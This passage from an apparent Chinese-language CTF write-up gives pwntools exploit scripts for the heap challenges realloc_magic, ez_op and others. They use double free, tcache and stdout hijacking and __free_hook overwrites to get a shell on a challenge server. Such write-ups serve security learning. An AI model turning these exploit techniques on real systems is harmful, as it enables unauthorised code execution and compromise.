        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def add(size, content):
        sh.sendlineafter('>> ', '1')
        sh.sendlineafter('sizen', str(size))
        sh.sendafter('contentn', content)
    def add2(size, content):
        time.sleep(0.1)
        sh.sendline('1')
        time.sleep(0.1)
        sh.send(str(size).ljust(8, ''))
        time.sleep(0.1)
        sh.send(content)
    def free():
        sh.sendlineafter('>> ', '2')
    sh.sendafter('username:', p64(0) + p64(0x71) + p64(0x602060))
    sh.sendafter('info:', p64(0) + p64(0x21))
    sh.sendlineafter('>> ', '666')
    sh.sendlineafter('free?n', '1')
    sh.sendafter('contentn', 'n')
    add(0x18, 'n')
    sh.sendlineafter('>> ', '666')
    sh.sendlineafter('free?n', '2')
    add(0x68, 'n')
    add(0x68, 'n')
    free()
    sh.sendlineafter('>> ', '666')
    sh.sendlineafter('free?n', '2')
    free()
    add(0x68, p64(0x602060))
    add(0x68, 'n')
    add(0x68, 'n')
    add(0x68, p64(0x602060) + 'a' * 0x10 + p64(elf.got['puts']) + p64(0xDEADBEEFDEADBEEF))
    sh.sendlineafter('>> ', '3')
    result = sh.recvuntil('n', drop=True)
    libc_addr = u64(result.ljust(8, '')) - 0x6f690
    log.success('libc_addr: ' + hex(libc_addr))
    main_arena_addr = libc_addr + 0x3c4b20
    log.success('main_arena_addr: ' + hex(main_arena_addr))
    add2(0x68, p64(main_arena_addr - 0x33))
    add2(0x68, 'n')
    '''
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''
    add2(0x68, 'b' * 0xb + p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))
    # pause()
    add2(0x68, 'cat flag >&0n')
    sh.interactive()
    clear()
###  realloc_magic
存在 double free ， 观察 realloc 源码可知当传入的chunk不为空，且size为0的情况下，会free掉原chunk并且返回0。
      if (bytes == 0 && oldmem != NULL)
        {
          __libc_free (oldmem); return 0;
        }
利用上面的技巧并配合漏洞劫持 tcache ，然后劫持 stdout， 最后劫持 hook， 由于其中需要爆破两次，所以概率是 1/256 。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    # context.log_level = 'debug'
    execve_file = './realloc_magic'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    sh = process(execve_file)
    # sh = remote('39.97.182.233', 37783)
    # elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        def pr
            x/gx &realloc_ptr
            end
        b realloc
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def realloc(size, content):
        sh.sendlineafter('>> ', '1')
        sh.sendlineafter('?n', str(size))
        sh.sendafter('?n', str(content))
    def free():
        sh.sendlineafter('>> ', '2')
    realloc(0x68, 'n')
    free()
    realloc(0x18, 'n')
    realloc(0, '')
    realloc(0x48, 'n')
    free()
    realloc(0, '')
    heap_two_byte = random.randint(0, 0xf) * 0x1000 + 0x0010
    log.info('heap_two_byte: ' + hex(heap_two_byte))
    # realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(0x7010))
    realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(heap_two_byte))
    realloc(0, '')
    realloc(0x48, 'n')
    realloc(0, '')
    # sh.sendlineafter('>> ', '666')
    realloc(0x48, 'xff' * 0x40)
    # realloc(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(0x7050))
    realloc(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(heap_two_byte + 0x40))
    realloc(0, '')
    realloc(0x18, p64(0) + p64(0))
    realloc(0, '')
    two_byte = random.randint(0, 0xf) * 0x1000 + 0x0760
    log.info('two_byte: ' + hex(two_byte))
    # realloc(0x1e8, p64(0) * 4 + 'x60x07xdd')
    realloc(0x1e8, p64(0) * 4 + p16(two_byte))
    realloc(0, '')
    realloc(0x58, p64(0xfbad2887 | 0x1000) + p64(0) * 3 +p8(0xc8))
    result = sh.recvn(8)
    libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
    log.success('libc_addr: ' + hex(libc_addr))
    sh.sendlineafter('>> ', '666')
    realloc(0x1e8, 'a' * 0x18 + p64(libc_addr + libc.symbols['__free_hook'] - 8))
    realloc(0, '')
    realloc(0x48, '/bin/sh' + p64(libc_addr + libc.symbols['system']))
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('?n', str(0))
    sh.interactive()
    clear()
###  ez_op
模拟虚拟机，没有任何防护，直接改 free 的hook 为 system 函数即可，最后留下字符串 sh 为参数就能起shell。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    # context.log_level = 'debug'
    execve_file = './pwn'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    sh = remote('39.97.182.233', 41610)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        b *0x0804A36C
        c
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    PUSH = 0x2A3D
    POP = 0xFFFF28
    GET = -1
    ADD = 0
    SUB = 0x11111
    DIV = 0x514
    SET = 0x10101010
    system_addr = 0x08051C60
    __free_hook_addr = 0x80E09F0
    opcode = [
        PUSH,
        PUSH,
        PUSH,
        GET,
        PUSH,
        SUB,
        DIV,
        SET,
    ]
    payload = ' '.join([str(v) for v in opcode])
    sh.sendline(payload)
    data = [
        system_addr,
        4,
        67,
        __free_hook_addr + 4,
        u32('sh'),
    ]
    payload = ' '.join([str(v) for v in data])
    sh.sendline(payload)
    sh.interactive()
    clear()
###  checkin
用gmp库实现的RSA算法，参数 e 可控，所以可以控制其在内存中的内容。
利用解密函数泄露出heap地址和libc地址，再根据 realloc 函数的特性劫持 hook 即可。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal, binascii
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')